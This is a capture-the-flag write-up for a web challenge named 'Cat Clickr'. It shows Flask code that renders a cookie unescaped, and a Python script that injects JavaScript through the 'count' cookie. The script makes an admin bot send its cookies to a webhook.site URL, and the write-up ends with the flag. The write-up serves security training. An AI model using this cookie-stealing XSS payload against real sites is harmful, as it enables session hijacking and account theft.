# Cat Clickr

## Challenge

Author: JJ

hey everybody!! imade my first website and its AWESOME!!!

if u dig closely u might even find some secrets…

check it out here: 1337.maplebacon.org

## Walkthrough

This is a classic admin bot visit web chall.

```python
template = """
...
  <p>{{ message }}</p>
  <p>u have clicked {{ count | safe }} times!</p>
...
"""

def generate(count: str) -> str:
    # ...
    return render_template_string(template, message=message, count=count)

@app.route("/stats")
def stats():
    webpage = generate(request.cookies.get("count", 0))
    unique_id = str(uuid4())
    pages[unique_id] = webpage
    adminbot.visit(f"http://127.0.0.1:31337/view?id={unique_id}", secure_cookie)
    return webpage
```

We're able to control `{{count}}` through the `count` cookie to inject javascript and extract the admin bots cookies.

```py
import requests

callback = 'https://webhook.site/redacted'

exploit = """
<script>
window.onload = function() {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", {callback}, false);
    xmlHttp.send(document.cookie);
}
</script>
"""

r = requests.get('http://1337.maplebacon.org/stats', cookies={'count': exploit})
print(r.status_code, r.text)
```

## Solve

`maple{c4t_51d3_cl1ck1ng}`
